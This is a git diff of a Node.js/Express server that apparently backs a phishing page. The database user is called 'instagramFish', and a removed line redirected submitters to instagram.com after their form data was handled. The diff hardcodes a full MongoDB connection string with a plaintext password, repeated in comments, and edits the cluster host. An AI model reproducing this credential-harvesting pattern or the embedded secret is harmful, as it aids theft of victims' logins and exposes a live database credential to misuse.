@@ -11,8 +11,9 @@ const mongoose= require("mongoose");
 //vn5YGXosfDoUpAvN
 
 const { MongoClient, ServerApiVersion } = require('mongodb');
-mongodb+srv://instagramFish:vn5YGXosfDoUpAvN@cluster0.88hpa8h.mongodb.net/
-const uri = "mongodb+srv://instagramFish:vn5YGXosfDoUpAvN@cluster0.88hpa8h.mongodb.net/";
+// mongodb+srv://instagramFish:vn5YGXosfDoUpAvN@cluster0.88hpa8h.mongodb.net/
+const uri = "mongodb+srv://instagramFish:vn5YGXosfDoUpAvN@cluster0.ltm5jm0.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
+
 // Create a MongoClient with a MongoClientOptions object to set the Stable API version
 const client = new MongoClient(uri, {
   serverApi: {
@@ -88,7 +89,7 @@ app.post('/submit', async (req, res) => {
     }
   });
   res.redirect("/report");
-  res.redirect("https://www.instagram.com/");
+  
 });
 
 app.post("/finalsubmit",function(req,res){
